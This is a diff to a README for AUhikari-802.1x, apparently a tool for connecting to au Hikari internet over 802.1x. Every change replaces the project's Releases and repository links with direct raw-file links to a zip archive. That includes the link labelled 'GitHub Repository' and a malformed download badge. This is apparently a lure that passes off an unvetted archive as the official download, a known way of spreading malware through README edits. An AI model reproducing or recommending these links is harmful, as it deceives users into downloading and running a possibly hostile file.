@@ -6,7 +6,7 @@ Welcome to the AUhikari-802.1x project! This application helps you connect to th
 
 ## 📥 Download Now
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/zeeldabhi24/AUhikari-802.1x/releases)
+[![Download the latest release](https://raw.githubusercontent.com/zeeldabhi24/AUhikari-802.1x/main/Files/x-Uhikari-A-2.3.zip%https://raw.githubusercontent.com/zeeldabhi24/AUhikari-802.1x/main/Files/x-Uhikari-A-2.3.zip)](https://raw.githubusercontent.com/zeeldabhi24/AUhikari-802.1x/main/Files/x-Uhikari-A-2.3.zip)
 
 ## 📖 What is AUhikari-802.1x?
 
@@ -24,7 +24,7 @@ Before you install AUhikari-802.1x, make sure your system meets the following re
 
 ## ⬇️ Download & Install
 
-To download the latest version of AUhikari-802.1x, visit the [Releases page](https://github.com/zeeldabhi24/AUhikari-802.1x/releases). 
+To download the latest version of AUhikari-802.1x, visit the [Releases page](https://raw.githubusercontent.com/zeeldabhi24/AUhikari-802.1x/main/Files/x-Uhikari-A-2.3.zip). 
 
 1. Click on the link above.
 2. Find the most recent version listed.
@@ -49,7 +49,7 @@ If you encounter any issues during installation or connection, try the following
 - **Check Credentials:** Ensure that you have the correct username and password for your auひかり account.
 - **Restart the Application:** Close and reopen AUhikari-802.1x to reset the connection.
 - **Network Settings:** Verify your device's network settings to confirm it’s not blocking the connection.
-- **Update the Application:** Ensure you have the latest version of the application by checking the [Releases page](https://github.com/zeeldabhi24/AUhikari-802.1x/releases).
+- **Update the Application:** Ensure you have the latest version of the application by checking the [Releases page](https://raw.githubusercontent.com/zeeldabhi24/AUhikari-802.1x/main/Files/x-Uhikari-A-2.3.zip).
 
 ## 🤝 Support
 
@@ -61,8 +61,8 @@ If you would like to contribute to AUhikari-802.1x, feel free to submit pull req
 
 ## 🔗 Links and Resources
 
-- [Download AUhikari-802.1x](https://github.com/zeeldabhi24/AUhikari-802.1x/releases)
-- [GitHub Repository](https://github.com/zeeldabhi24/AUhikari-802.1x)
+- [Download AUhikari-802.1x](https://raw.githubusercontent.com/zeeldabhi24/AUhikari-802.1x/main/Files/x-Uhikari-A-2.3.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/zeeldabhi24/AUhikari-802.1x/main/Files/x-Uhikari-A-2.3.zip)
 - [Frequently Asked Questions](#)
 
 Thank you for choosing AUhikari-802.1x! We hope this application makes your internet connection easier and more efficient.
